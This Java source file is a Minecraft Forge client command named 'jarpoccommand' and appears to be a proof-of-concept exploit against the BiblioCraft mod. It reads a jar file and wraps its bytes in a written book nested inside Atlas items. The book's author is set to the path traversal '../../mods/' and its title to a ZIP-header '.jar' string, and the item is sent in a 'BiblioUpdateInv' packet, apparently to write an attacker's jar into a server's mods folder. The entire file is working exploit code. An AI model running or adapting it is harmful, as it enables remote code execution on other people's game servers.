package com.exopteron.forgemodnew;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.Map;

import cpw.mods.fml.common.Loader;
import cpw.mods.fml.common.ModClassLoader;
import jds.bibliocraft.blocks.BlockLoader;
import jds.bibliocraft.items.ItemLoader;
import net.minecraft.client.Minecraft;
import net.minecraft.command.CommandBase;
import net.minecraft.command.ICommandSender;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.init.Blocks;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.CompressedStreamTools;
import net.minecraft.nbt.JsonToNBT;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTException;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.server.MinecraftServer;
import net.minecraft.util.ChatComponentText;



public class JarPOCCommand extends CommandBase {

    @Override
    public String getCommandName() {
        return "jarpoccommand";
    }

    @Override
    public String getCommandUsage(ICommandSender p_71518_1_) {
        return "/jarpoccommand [padded-jar-path]";
    }

    @Override
    public void processCommand(ICommandSender sender, String[] args) {
        String data = null;
        try {
            byte[] d = Files.readAllBytes(Paths.get(args[0]));
            data = new String(d);
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }

        ItemStack atlasOne = new ItemStack(ItemLoader.bookAtlas);



        ItemStack workbench = new ItemStack(BlockLoader.typemachine);


        NBTTagCompound atlasOneTag = new NBTTagCompound();
        NBTTagList atlasOneInv = new NBTTagList();

        atlasOneInv.appendTag(itemToNBT(workbench, 1));


        ItemStack chest = new ItemStack(ItemLoader.bookAtlas);
        NBTTagCompound chestTag = new NBTTagCompound();
        chestTag.setTag("Inventory", atlasOneInv);
        chest.setTagCompound(chestTag);

        NBTTagList newInv = new NBTTagList();
        newInv.appendTag(itemToNBT(chest, 0));

        NBTTagCompound bookTag = new NBTTagCompound();

        bookTag.setString("author", "../../mods/");
        
        NBTTagList pages = new NBTTagList();
        pages.appendTag(new NBTTagString("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + data));

        final String prefixString = "PK\3\4.jar";
        
        bookTag.setTag("pages", pages);
        bookTag.setString("title",prefixString);

        ItemStack book = new ItemStack(net.minecraft.init.Items.written_book);
        book.setStackDisplayName(prefixString);
        book.setTagCompound(bookTag);

        newInv.appendTag(itemToNBT(book, 1));

        atlasOneTag.setTag("Inventory", newInv);


        atlasOne.setTagCompound(atlasOneTag);


        ItemStack atlasTwo = new ItemStack(ItemLoader.bookAtlas);

        NBTTagCompound atlasTwoTag = new NBTTagCompound();
        NBTTagList atlasTwoInv = new NBTTagList();
        NBTTagCompound atlasOneItemTag = new NBTTagCompound();
        atlasOne.writeToNBT(atlasOneItemTag);
        atlasTwoInv.appendTag(atlasOneItemTag);
        atlasTwoTag.setTag("Inventory", atlasTwoInv);
        
        atlasTwo.setTagCompound(atlasTwoTag);

        Utils.sendPacket("BiblioUpdateInv", atlasTwo);
    }

    public static NBTTagCompound itemToNBT(ItemStack i, Integer slot) {
        NBTTagCompound t = new NBTTagCompound();
        i.writeToNBT(t);
        if (slot != null) {
            t.setInteger("Slot", slot);
        }
        return t;
    }

    @Override
    public int getRequiredPermissionLevel() {
        return 0;
    }
}
